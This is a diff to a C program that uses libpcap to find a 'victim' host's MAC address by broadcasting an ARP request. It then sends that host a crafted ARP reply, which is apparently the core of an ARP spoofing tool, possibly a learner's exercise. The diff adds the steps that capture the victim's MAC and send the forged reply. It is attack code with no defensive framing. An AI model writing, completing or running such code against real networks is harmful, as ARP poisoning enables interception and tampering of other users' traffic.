@@ -72,14 +72,13 @@ int main(int argc, char* argv[])
 	//-------------------------------------------------------------
 
 	ether_h ethernet;
-	ethernet.dst[0];	//add
 	int i;
 	for(i = 0; i < 6; i++)
 	{
-		ethernet.src[i] = my_mac[i];	//my_mac is failed...
+		ethernet.src[i] = my_mac[i];
 		ethernet.dst[i] = 0xff;
 	}
-	ethernet.type = htons(0x0806);		//modify please
+	ethernet.type = htons(0x0806);		//modify need
 
 	arp_h arp;
 	arp.hard_type = htons(1); //ethernet
@@ -106,15 +105,14 @@ int main(int argc, char* argv[])
 		printf("Can't send the packet!\n");
 		return -1;
 	}
-	free(send_packet);
 
 	const unsigned char *packet;
 	int is_ok;
 	ether_h *ether_cover;
 	arp_h *arp_cover;
 	struct pcap_pkthdr *header;
-	unsigned char victim_ip[20];			// 20 is right??
-	unsigned char victim_mac[20];
+	unsigned char victim_ip[20];			//this is string / 20 is right??
+	unsigned char victim_mac[6];
 	while(1)
 	{
 		is_ok = pcap_next_ex(handle, &header, &packet);
@@ -134,6 +132,9 @@ int main(int argc, char* argv[])
 				if(!strncmp(victim_ip, argv[1], strlen(argv[1])))
 				{
 					printf("OK\n");	
+					for(i = 0; i < 6; i++)
+						victim_mac[i] = arp_cover->hard_src[i];
+					break;
 				}
 				else
 				{
@@ -150,11 +151,25 @@ int main(int argc, char* argv[])
 			printf("Not ARP\n");
 		}
 	}
-	memset(send_packet, 0, sizeof(ethernet));
+	memset(send_packet, 0, sizeof(ethernet)+sizeof(arp));
+	
+	for(i = 0; i < 6; i++)
+	{
+		ethernet.dst[i] = victim_mac[i];
+		arp.hard_dst[i] = victim_mac[i];
+	}
+	arp.opcode = htons(2);
+
 	memcpy(send_packet, &ethernet, sizeof(ethernet));
+	memcpy(send_packet + sizeof(ethernet), &arp, sizeof(arp));
 	
+	if(pcap_sendpacket(handle, send_packet, sizeof(ethernet)+sizeof(arp)) != 0)
+	{
+		printf("Can't send the packet!\n");
+		return -1;
+	}
 	
-	
+	free(send_packet);
 //	close(handle);		//in <unistd.h>
 	
 	return 0;
